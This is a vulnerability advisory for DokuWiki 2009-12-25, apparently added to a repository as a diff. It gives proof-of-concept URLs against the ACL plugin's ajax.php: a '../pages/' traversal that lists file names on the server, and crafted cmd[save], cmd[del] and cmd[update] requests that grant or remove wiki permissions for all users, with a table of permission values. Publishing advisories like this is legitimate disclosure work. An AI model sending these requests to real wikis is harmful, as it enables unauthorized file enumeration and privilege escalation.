@@ -1,0 +1,44 @@
+Reported:        13-01-2010
+Patched:        13-01-2010
+Released:        14-01-2010
+Vulnerable version :     
+http://www.splitbrain.org/_media/projects/dokuwiki/dokuwiki-2009-12-25.tgz
+Patched version:    
+http://www.splitbrain.org/_media/projects/dokuwiki/dokuwiki-2009-12-25b.tgz
+Author:            white_sheep
+Contact:        white_sheep@ihteam.net - https://www.ihteam.net
+
+--------------------  Show Outside Directory
+
+PoC :
+
+     http://server/plugins/acl/ajax.php?ajax=tree&ns=../pages/
+
+     The bug allows listing the names of arbitrary file on the webserver 
+- NOT THEIR CONTENTS.
+
+
+--------------------  Arbitrary Change or Delete Wiki Permission
+
+PoC :
+
+     
+http://server/lib/plugins/acl/ajax.php?ajax=info&id=wiki&acl_w=@ALL&cmd[save]=1&acl=(ACL) 
+
+             add to acl.auth.php read or write authorization.
+
+     
+http://server/lib/plugins/acl/ajax.php?ajax=info&id=wiki&acl_w=@ALL&cmd[del]=1&acl=(ACL)
+             delete from acl.auth.php an eventually authorization like 
+(ACL).
+
+     
+http://server/lib/plugins/acl/ajax.php?ajax=info&id=wiki&acl_w=@ALL&cmd[update]=1&acl=(ACL)
+             delete from acl.auth.php all authorization like (ACL).
+
+     where (ACL) must be:
+         1     -> read
+         2     -> modified
+         4     -> creation
+         8     -> upload
+         16     -> delete
